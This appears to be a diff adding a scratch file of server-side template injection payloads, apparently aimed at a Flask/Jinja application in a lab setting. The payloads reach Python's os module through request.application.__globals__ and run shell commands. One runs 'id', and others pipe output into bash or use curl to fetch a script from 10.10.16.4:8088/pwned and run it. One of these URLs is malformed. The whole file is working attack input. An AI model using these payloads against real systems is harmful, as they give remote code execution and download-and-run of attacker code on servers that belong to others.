@@ -1,0 +1,18 @@
+
+
+
+ ${{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}
+
+
+ ${{request.application.__globals__.__builtins__.__import__("os").popen("ls | bash").read()}}
+
+  ${{request.application.__globals__.__builtins__.__import__("os").popen("curl http/\/10.10.16.4:8088/pwned | bash ").read()}}
+
+ ${{request.application.__globals__.__builtins__.__import__("os").popen("curl http://10.10.16.4:8088/pwned | bash").read()}}
+
+
+
+
+
+
+
